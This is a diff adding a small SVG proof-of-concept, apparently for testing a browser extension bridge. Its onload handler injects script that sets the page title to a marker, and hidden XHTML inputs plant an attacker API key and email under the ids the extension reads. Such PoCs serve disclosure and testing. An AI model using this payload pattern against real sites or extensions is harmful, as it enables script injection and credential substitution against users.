@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="160" onload="document.title='INJECTED-APEX'">
+  <input xmlns="http://www.w3.org/1999/xhtml" id="wrs_api_key" value="ATTACKER_KEY_777"/>
+  <input xmlns="http://www.w3.org/1999/xhtml" id="wrs_email" value="attacker@example.com"/>
+  <text x="10" y="100" font-size="16" fill="#000">extension bridge PoC (apex)</text>
+</svg>
